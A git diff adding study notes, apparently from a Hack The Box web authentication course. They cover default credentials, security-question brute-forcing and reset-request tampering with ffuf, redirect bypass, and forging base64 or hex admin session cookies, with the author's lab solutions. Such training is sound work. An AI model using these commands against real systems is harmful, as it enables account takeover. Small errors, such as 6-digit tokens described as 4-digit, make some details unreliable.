@@ -396,7 +396,540 @@ From a security perspective, it is essential not to reveal a CAPTCHA's solution 
 
 Additionally, tools and browser extensions to solve CAPTCHAs automatically are rising. Many open-source CAPTCHA solvers can be found. In particular, the rise of AI-driven tools provides CAPTCHA-solving capabilities by utilizing powerful image recognition or voice recognition machine learning models.
 
+# Default Credentials
 
+Many web applications are set up with default credentials to allow accessing it after installation. However, these credentials need to be changed after the initial setup of the web application; otherwise, they provide an easy way for attackers to obtain authenticated access. As such, [Testing for Default Credentials](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials) is an essential part of authentication testing in OWASP's Web Application Security Testing Guide. According to OWASP, common default credentials include `admin` and `password`.
 
+## Testing Default Credentials
 
+Many platforms provide lists of default credentials for a wide variety of web applications. Such an example is the web database maintained by [CIRT.net](https://www.cirt.net/passwords). For instance, if we identified a Cisco device during a penetration test, we can search the database for default credentials for Cisco devices:
+
+![](Pasted%20image%2020250316182748.png)
+
+Further resources include [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) as well as the [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master) GitHub repository which contains a list of default passwords for a variety of different vendors.
+
+A targeted internet search is a different way of obtaining default credentials for a web application. Let us assume we stumble across a [BookStack](https://github.com/BookStackApp/BookStack) web application during an engagement:
+
+![](Pasted%20image%2020250316182755.png)
+
+We can try to search for default credentials by searching something like `bookstack default credentials`:
+
+![](Pasted%20image%2020250316182802.png)
+
+As we can see, the results contain the installation instructions for BookStack, which state that the default admin credentials are `admin@admin.com:password`.
+
+# Vulnerable Password Reset
+
+We have already discussed how to brute-force password reset tokens to take over a victim's account. However, even if a web application utilizes rate limiting and CAPTCHAs, business logic bugs within the password reset functionality can allow taking over other users' accounts.
+
+## Guessable Password Reset Questions
+
+Often, web applications authenticate users who have lost their passwords by requesting that they answer one or multiple security questions. During registration, users provide answers to predefined and generic security questions, disallowing users from entering custom ones. Therefore, within the same web application, the security questions of all users will be the same, allowing attackers to abuse them.
+
+Assuming we had found such functionality on a target website, we should try abusing it to bypass authentication. Often, the weak link in a question-based password reset functionality is the predictability of the answers. It is common to find questions like the following:
+
+- "`What is your mother's maiden name?`"
+- "`What city were you born in?`"
+
+While these questions seem tied to the individual user, they can often be obtained through `OSINT` or guessed, given a sufficient number of attempts, i.e., a lack of brute-force protection.
+
+For instance, assuming a web application uses a security question like `What city were you born in?`:
+
+![](Pasted%20image%2020250316183010.png)
+
+We can attempt to brute-force the answer to this question by using a proper wordlist. There are multiple lists containing large cities in the world. For instance, [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world. This is a great starting point for brute-forcing the city a user was born in.
+
+Since the CSV file contains the city name in the first field, we can create our wordlist containing only the city name on each line using the following command:
+
+```shell
+gitblanc@htb[/htb]$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
+
+gitblanc@htb[/htb]$ wc -l city_wordlist.txt 
+
+26468 city_wordlist.txt
+```
+
+As we can see, this results in a total of 26,468 cities.
+
+To set up our brute-force attack, we first need to specify the user we want to target:
+
+![](Pasted%20image%2020250316183025.png)
+
+As an example, we will target the user `admin`. After specifying the username, we must answer the user's security question. The corresponding request looks like this:
+
+![](Pasted%20image%2020250316183033.png)
+
+We can set up the corresponding `ffuf` command from this request to brute-force the answer. Keep in mind that we need to specify our session cookie to associate our request with the username `admin` we specified in the previous step:
+
+```shell
+gitblanc@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
+
+<SNIP>
+
+[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
+    * FUZZ: Houston
+```
+
+After obtaining the security response, we can reset the admin user's password and entirely take over the account:
+
+![](Pasted%20image%2020250316183051.png)
+
+We could narrow down the cities if we had additional information on our target to reduce the time required for our brute-force attack on the security question. For instance, if we knew that our target user was from Germany, we could create a wordlist containing only German cities, reducing the number to about a thousand cities:
+
+```shell
+gitblanc@htb[/htb]$ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
+
+gitblanc@htb[/htb]$ wc -l german_cities.txt 
+
+1117 german_cities.txt
+```
+
+## Manipulating the Reset Request
+
+Another instance of a flawed password reset logic occurs when a user can manipulate a potentially hidden parameter to reset the password of a different account.
+
+For instance, consider the following password reset flow, which is similar to the one discussed above. First, we specify the username:
+
+![](Pasted%20image%2020250316183112.png)
+
+We will use our demo account `htb-stdnt`, which results in the following request:
+
+```http
+POST /reset.php HTTP/1.1
+Host: pwreset.htb
+Content-Length: 18
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
+
+username=htb-stdnt
+```
+
+Afterward, we need to supply the response to the security question:
+
+![](Pasted%20image%2020250316183124.png)
+
+Supplying the security response `London` results in the following request:
+
+```http
+POST /security_question.php HTTP/1.1
+Host: pwreset.htb
+Content-Length: 43
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
+
+security_response=London&username=htb-stdnt
+```
+
+As we can see, the username is contained in the form as a hidden parameter and sent along with the security response. Finally, we can reset the user's password:
+
+![](Pasted%20image%2020250316183139.png)
+
+The final request looks like this:
+
+```http
+POST /reset_password.php HTTP/1.1
+Host: pwreset.htb
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
+
+password=P@$$w0rd&username=htb-stdnt
+```
+
+Like the previous request, the request contains the username in a separate POST parameter. Suppose the web application does properly verify that the usernames in both requests match. In that case, we can skip the security question or supply the answer to our security question and then set the password of an entirely different account. For instance, we can change the admin user's password by manipulating the `username` parameter of the password reset request:
+
+```http
+POST /reset_password.php HTTP/1.1
+Host: pwreset.htb
+Content-Length: 32
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
+
+password=P@$$w0rd&username=admin
+```
+
+To prevent this vulnerability, keeping a consistent state during the entire password reset process is essential. Resetting an account's password is a sensitive process where minor implementation flaws or logic bugs can enable an attacker to take over other users' accounts. As such, we should investigate the password reset functionality of any web application closely and keep an eye out for potential security issues.
+
+>[!Example]
+>The Academy's exercise for this section
+
+If I catch the request:
+
+![](Pasted%20image%2020250316184017.png)
+
+The incorrect response gives this message:
+
+![](Pasted%20image%2020250316184450.png)
+
+I know that the POST parameter is `security_response`, so I'll fuzz it with **ffuf**. But First I'll generate a list with cities:
+
+```shell
+git clone https://github.com/datasets/world-cities.git
+cd world-cities
+cat data/world-cities.csv | cut -d ',' -f1 > cities.txt
+
+ffuf -w ./cities.txt -u http://94.237.59.30:34543/security_question.php -X POST -d "security_response=FUZZ" -b "PHPSSID=ih9idotupft99ua205rlcg2jr3" -H "Content-Type: application/x-www-form-urlencoded" -fc 200
+```
+
+![](Pasted%20image%2020250316185553.png)
+
+![](Pasted%20image%2020250316185656.png)
+
+# Authentication Bypass via Direct Access
+
+After discussing various attacks on flawed authentication implementations, this section will showcase vulnerabilities that allow for the complete bypassing of authentication mechanisms.
+
+## Direct Access
+
+The most straightforward way of bypassing authentication checks is to request the protected resource directly from an unauthenticated context. An unauthenticated attacker can access protected information if the web application does not properly verify that the request is authenticated.
+
+For instance, let us assume that we know that the web application redirects users to the `/admin.php` endpoint after successful authentication, providing protected information only to authenticated users. If the web application relies solely on the login page to authenticate users, we can access the protected resource directly by accessing the `/admin.php` endpoint.
+
+While this scenario is uncommon in the real world, a slight variant occasionally happens in vulnerable web applications. To illustrate the vulnerability, let us assume a web application uses the following snippet of PHP code to verify whether a user is authenticated:
+
+```php
+if(!$_SESSION['active']) {
+	header("Location: index.php");
+}
+```
+
+This code redirects the user to `/index.php` if the session is not active, i.e., if the user is not authenticated. However, the PHP script does not stop execution, resulting in protected information within the page being sent in the response body:
+
+![](Pasted%20image%2020250316185914.png)
+
+As we can see, the entire admin page is contained in the response body. However, if we attempt to access the page in our web browser, the browser follows the redirect and displays the login prompt instead of the protected admin page. We can easily trick the browser into displaying the admin page by intercepting the response and changing the status code from `302` to `200`. To do this, enable `Intercept` in Burp. Afterward, browse to the `/admin.php` endpoint in the web browser. Next, right-click on the request and select `Do intercept > Response to this request` to intercept the response:
+
+![](Pasted%20image%2020250316185921.png)
+
+Afterward, forward the request by clicking on `Forward`. Since we intercepted the response, we can now edit it. To force the browser to display the content, we need to change the status code from `302 Found` to `200 OK`:
+
+![](Pasted%20image%2020250316185930.png)
+
+Afterward, we can forward the response. If we switch back to our browser window, we can see that the protected information is rendered:
+
+![](Pasted%20image%2020250316185937.png)
+
+To prevent the protected information from being returned in the body of the redirect response, the PHP script needs to exit after issuing the redirect:
+
+```php
+if(!$_SESSION['active']) {
+	header("Location: index.php");
+	exit;
+}
+```
+
+>[!Example]
+>The Academy's exercise for this section
+
+If I modify the status code to `200` I can make a direct access bypass:
+
+![](Pasted%20image%2020250316190452.png)
+
+![](Pasted%20image%2020250316190526.png)
+
+# Authentication Bypass via Parameter Modification
+
+An authentication implementation can be flawed if it depends on the presence or value of an HTTP parameter, introducing authentication vulnerabilities. As in the previous section, such vulnerabilities might lead to authentication and authorization bypasses, allowing for privilege escalation.
+
+This type of vulnerability is closely related to authorization issues such as `Insecure Direct Object Reference (IDOR)` vulnerabilities, which are covered in more detail in the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.
+
+## Parameter Modification
+
+Let us take a look at our target web application. This time, we are provided with credentials for the user `htb-stdnt`. After logging in, we are redirected to `/admin.php?user_id=183`:
+
+![](Pasted%20image%2020250316190633.png)
+
+In our web browser, we can see that we seem to be lacking privileges, as we can only see a part of the available data:
+
+![](Pasted%20image%2020250316190646.png)
+
+To investigate the purpose of the `user_id` parameter, let us remove it from our request to `/admin.php`. When doing so, we are redirected back to the login screen at `/index.php`, even though our session provided in the `PHPSESSID` cookie is still valid:
+
+![](Pasted%20image%2020250316190654.png)
+
+Thus, we can assume that the parameter `user_id` is related to authentication. We can bypass authentication entirely by accessing the URL `/admin.php?user_id=183` directly:
+
+![](Pasted%20image%2020250316190700.png)
+
+Based on the parameter name `user_id`, we can infer that the parameter specifies the ID of the user accessing the page. If we can guess or brute-force the user ID of an administrator, we might be able to access the page with administrative privileges, thus revealing the admin information. We can use the techniques discussed in the `Brute-Force Attacks` sections to obtain an administrator ID. Afterward, we can obtain administrative privileges by specifying the admin's user ID in the `user_id` parameter.
+
+## Final Remark
+
+Note that many more advanced vulnerabilities can also lead to an authentication bypass, which we have not covered in this module but are covered by more advanced modules. For instance, Type Juggling leading to an authentication bypass is covered in the [Whitebox Attacks](https://academy.hackthebox.com/module/details/205) module, how different injection vulnerabilities can lead to an authentication bypass is covered in the [Injection Attacks](https://academy.hackthebox.com/module/details/204) and [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33) modules, and logic bugs that can lead to an authentication bypass are covered in the [Parameter Logic Bugs](https://academy.hackthebox.com/module/details/239) module.
+
+>[!Example]
+>The Academy's exercise for this section
+
+![](Pasted%20image%2020250316191121.png)
+
+I'll brute force the id of the admin with CAIDO:
+
+![](Pasted%20image%2020250316191716.png)
+
+![](Pasted%20image%2020250316191700.png)
+
+Got the admin id which is `372`:
+
+![](Pasted%20image%2020250316191837.png)
+
+# Attacking Session Tokens
+
+So far, we have focused on abusing flawed implementations of web applications authentication. However, vulnerabilities related to authentication can arise not only from the implementation of the authentication itself but also from the handling of session tokens. Session tokens are unique identifiers a web application uses to identify a user. More specifically, the session token is tied to the user's session. If an attacker can obtain a valid session token of another user, the attacker can impersonate the user to the web application, thus taking over their session.
+
+## Brute-Force Attack
+
+Suppose a session token does not provide sufficient randomness and is cryptographically weak. In that case, we can brute-force valid session tokens similarly to how we were able to brute-force valid password-reset tokens. This can happen if a session token is too short or contains static data that does not provide randomness to the token, i.e., the token provides [insufficient entropy](https://owasp.org/www-community/vulnerabilities/Insufficient_Entropy).
+
+For instance, consider the following web application that assigns a four-character session token:
+
+![](Pasted%20image%2020250316191915.png)
+
+As we have seen in previous sections, a four-character string can easily be brute-forced. Thus, we can use the techniques and commands discussed in the `Brute-Force Attacks` sections to brute-force all possible session tokens and hijack all active sessions.
+
+This scenario is relatively uncommon in the real world. In a slightly more common variant, the session token itself provides sufficient length; however, the token consists of hardcoded prepended and appended values, while only a small part of the session token is dynamic to provide randomness. For instance, consider the following session token assigned by a web application:
+
+![](Pasted%20image%2020250316191930.png)
+
+The session token is 32 characters long; thus, it seems infeasible to enumerate other users' valid sessions. However, let us send the login request multiple times and take note of the session tokens assigned by the web application. This results in the following session tokens:
+
+```
+2c0c58b27c71a2ec5bf2b4b6e892b9f9
+2c0c58b27c71a2ec5bf2b4546092b9f9
+2c0c58b27c71a2ec5bf2b497f592b9f9
+2c0c58b27c71a2ec5bf2b48bcf92b9f9
+2c0c58b27c71a2ec5bf2b4735e92b9f9
+```
+
+As we can see, all session tokens are very similar. In fact, of the 32 characters, 28 are the same for all five captured sessions. The session tokens consist of the static string `2c0c58b27c71a2ec5bf2b4` followed by four random characters and the static string `92b9f9`. This reduces the effective randomness of the session tokens. Since 28 out of 32 characters are static, there are only four characters we need to enumerate to brute-force all existing active sessions, enabling us to hijack all active sessions.
+
+Another vulnerable example would be an incrementing session identifier. For instance, consider the following capture of successive session tokens:
+
+```
+141233
+141234
+141237
+141238
+141240
+```
+
+As we can see, the session tokens seem to be incrementing numbers. This makes enumeration of all past and future sessions trivial, as we simply need to increment or decrement our session token to obtain active sessions and hijack other users' accounts.
+
+As such, it is crucial to capture multiple session tokens and analyze them to ensure that session tokens provide sufficient randomness to disallow brute-force attacks against them.
+
+## Attacking Predictable Session Tokens
+
+In a more realistic scenario, the session token does provide sufficient randomness on the surface. However, the generation of session tokens is not truly random; it can be predicted by an attacker with insight into the session token generation logic. 
+
+The simplest form of predictable session tokens contains encoded data we can tamper with. For instance, consider the following session token:
+
+![](Pasted%20image%2020250316191949.png)
+
+While this session token might seem random at first, a simple analysis reveals that it is base64-encoded data:
+
+```shell
+gitblanc@htb[/htb]$ echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
+
+user=htb-stdnt;role=user
+```
+
+As we can see, the cookie contains information about the user and the role tied to the session. However, there is no security measure in place that prevents us from tampering with the data. We can forge our own session token by manipulating the data and base64-encoding it to match the expected format. This enables us to forge an admin cookie:
+
+```shell
+gitblanc@htb[/htb]$ echo -n 'user=htb-stdnt;role=admin' | base64
+
+dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
+```
+
+We can send this cookie to the web application to obtain administrative access:
+
+![](Pasted%20image%2020250316192008.png)
+
+The same exploit works for cookies containing differently encoded data. We should also keep an eye out for data in hex-encoding or URL-encoding. For instance, a session token containing hex-encoded data might look like this:
+
+![](Pasted%20image%2020250316192015.png)
+
+Just like before, we can forge an admin cookie:
+
+```shell
+gitblanc@htb[/htb]$ echo -n 'user=htb-stdnt;role=admin' | xxd -p
+
+757365723d6874622d7374646e743b726f6c653d61646d696e
+```
+
+Another variant of session tokens contains the result of an encryption of a data sequence. A weak cryptographic algorithm could lead to privilege escalation or authentication bypass, just like plain encoding. Improper handling of cryptographic algorithms or injection of user-provided data into the input of an encryption function can lead to vulnerabilities in the session token generation. However, it is often challenging to attack encryption-based session tokens in a black box approach without access to the source code responsible for session token generation.
+
+>[!Example]
+>The Academy's exercise for this section.
+
+![](Pasted%20image%2020250316192914.png)
+
+If I catch the request with CAIDO:
+
+![](Pasted%20image%2020250316193157.png)
+
+If we decode it in **CyberChef**:
+
+![](Pasted%20image%2020250316193133.png)
+
+So we can change it to have admin privileges:
+
+![](Pasted%20image%2020250316193250.png)
+
+# Further Session Attacks
+
+After discussing how to attack session tokens, we will now understand two attack vectors against flawed handling of session tokens in web applications.
+
+More advanced session attacks, such as Session Puzzling, are covered in the [Abusing HTTP Misconfigurations](https://academy.hackthebox.com/module/details/189) module.
+
+## Session Fixation
+
+[Session Fixation](https://owasp.org/www-community/attacks/Session_fixation) is an attack that enables an attacker to obtain a victim's valid session. A web application vulnerable to session fixation does not assign a new session token after a successful authentication. If an attacker can coerce the victim into using a session token chosen by the attacker, session fixation enables an attacker to steal the victim's session and access their account.
+
+For instance, assume a web application vulnerable to session fixation uses a session token in the HTTP cookie `session`. Furthermore, the web application sets the user's session cookie to a value provided in the `sid` GET parameter. Under these circumstances, a session fixation attack could look like this:
+
+1. An attacker obtains a valid session token by authenticating to the web application. For instance, let us assume the session token is `a1b2c3d4e5f6`. Afterward, the attacker invalidates their session by logging out.
+2. The attacker tricks the victim to use the known session token by sending the following link: `http://vulnerable.htb/?sid=a1b2c3d4e5f6`. When the victim clicks this link, the web application sets the `session` cookie to the provided value, i.e., the response looks like this:
+
+```http
+HTTP/1.1 200 OK
+[...]
+Set-Cookie: session=a1b2c3d4e5f6
+[...]
+```
+
+3. The victim authenticates to the vulnerable web application. The victim's browser already stores the attacker-provided session cookie, so it is sent along with the login request. The victim uses the attacker-provided session token since the web application does not assign a new one.
+4. Since the attacker knows the victim's session token `a1b2c3d4e5f6`, they can hijack the victim's session.
+
+A web application must assign a new randomly generated session token after successful authentication to prevent session fixation attacks.
+
+## Improper Session Timeout
+
+Lastly, a web application must define a proper [Session Timeout](https://owasp.org/www-community/Session_Timeout) for a session token. After the time interval defined in the session timeout has passed, the session will expire, and the session token is no longer accepted. If a web application does not define a session timeout, the session token would be valid infinitely, enabling an attacker to use a hijacked session effectively forever.
+
+For the security of a web application, the session timeout must be appropriately set. Because each web application has different business requirements, there is no universal session timeout value. For instance, a web application dealing with sensitive health data should probably set a session timeout in the range of minutes. In contrast, a social media web application might set a session timeout of multiple hours.
+
+# Skills Assesment
+
+![](Pasted%20image%2020250316193708.png)
+
+I'll register a new account:
+
+![](Pasted%20image%2020250316193951.png)
+
+I got the password policy rules:
+
+![](Pasted%20image%2020250316194016.png)
+
+I set up: `gitblanc:1qwertyuiopA`. Then I logged in:
+
+![](Pasted%20image%2020250316194156.png)
+
+As I didn't find anything to escalate, I'll noticed something weird in the login form. If you put a valid username and wrong password yo'll get this message: `Invalid credentials.`, but if you put both wrong username and password you get this message: `Unknown username or password.`:
+
+![](Pasted%20image%2020250316195409.png)
+
+![](Pasted%20image%2020250316195444.png)
+
+So I'll use **ffuf** to enumerate for users:
+
+```shell
+ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.59.30:35039/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown username or password." -s
+
+[redacted]
+gladys
+```
+
+So now, as the password policy establish, I'll generate a custom wordlist and try to fuzz her password:
+
+```shell
+grep '[[:digit:]]' /usr/share/wordlists/rockyou.txt | grep '[[:lower:]]' | grep '[[:upper:]]' | grep '[[:alnum:]]' | grep '^.\{12\}$' > custom_wordlist.txt
+
+wc -l custom_wordlist.txt 
+
+20453 custom_wordlist.txt
+```
+
+So now I'll brute force the username `gladys` with the previous password:
+
+```shell
+ffuf -w ./custom_wordlist.txt -u http://94.237.59.30:35039/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials." -s
+
+[redacted]
+dWinaldasD13
+```
+
+I logged in and got a prompt for 2FA:
+
+![](Pasted%20image%2020250316200711.png)
+
+I'll generate a wordlist containing all possible 4-digit tokens:
+
+```shell
+seq -w 0 999999 > tokens.txt
+```
+
+Now I'll fuzz it:
+
+```shell
+ffuf -w ./tokens.txt -u http://94.237.59.30:35039/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=ih9idotupft99ua205rlcg2jr3; session=757365723d6874622d7374646e743b726f6c653d75736572" -d "otp=FUZZ" -fr "Invalid OTP." -s
+```
+
+This didn't work because of the rate limit of the app. After 3 unsuccessful tries, the page redirects back to the `login.php`. So I'll try to modify the `Location` of the reponse of the login request to `profile.php`:
+
+![](Pasted%20image%2020250316202038.png)
+
+![](Pasted%20image%2020250316202053.png)
+
+![](Pasted%20image%2020250316202121.png)
+
+I'll also change the `302` Redirect to a `200`:
+
+![](Pasted%20image%2020250316202208.png)
+
+![](Pasted%20image%2020250316202225.png)
+
+# HTB Cheatsheet
+
+## Categories of Authentication
+
+- Knowledge: passwords, PINs, ...
+- Ownership: ID cards, TOTP
+- Inherence: Biometric authentication
+
+## Brute-Force Attacks
+
+- User Enumeration
+- Brute-Forcing Passwords
+- Brute-Forcing Password Reset Tokens
+- Brute-Forcing 2FA Codes
+- Bypassing Brute-Force Protection
+    - Rate Limit: `X-Forwarded-For` HTTP Header
+    - CAPTCHAs: Look for CAPTCHA solution in HTML code
+
+## Password Attacks
+
+- Default Credentials
+    - [CIRT.net](https://www.cirt.net/passwords)
+    - [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
+    - [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master)
+- Vulnerable Password Reset
+    - Guessable Security Questions
+    - Username Injection in Reset Request
+
+## Authentication Bypasses
+
+- Accessing the protected page directly
+- Manipulating HTTP Parameters to access protected pages
+
+## Session Attacks
+
+- Brute-Forcing cookies with insufficient entropy
+- Session Fixation
+    - Attacker obtains valid session identifier
+    - Attacker coerces victim to use this session identifier (social engineering)
+    - Victim authenticates to the vulnerable web application
+    - Attacker knows the victim's session identifier and can hijack their account
+- Improper Session Timeout
+    - Sessions should expire after an appropriate time interval
+    - Session validity duration depends on the web application
 
